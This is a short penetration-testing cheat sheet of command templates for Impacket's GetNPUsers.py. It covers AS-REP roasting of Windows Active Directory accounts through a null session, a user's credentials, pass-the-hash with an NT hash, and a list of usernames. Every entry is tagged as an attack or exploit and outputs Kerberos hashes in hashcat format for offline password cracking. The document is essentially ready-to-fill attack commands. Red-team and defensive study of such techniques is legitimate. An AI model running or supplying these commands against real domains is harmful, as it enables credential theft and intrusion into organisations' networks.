# GetNPUsers (imp)

% impacket-kerberos, windows, kerberos, 88

## ASREPRoasting (null session)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> '<domain_fqdn>/'
```

## ASREPRoasting (user account)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> '<domain_fqdn>/<user>:<password>'
```


## ASREPRoasting (pth)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> -hashes :<nt_hash> '<domain_fqdn>/<user>'
```

## ASREPRoasting (userlist)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain_fqdn>/ -usersfile <users_file> -format hashcat
```
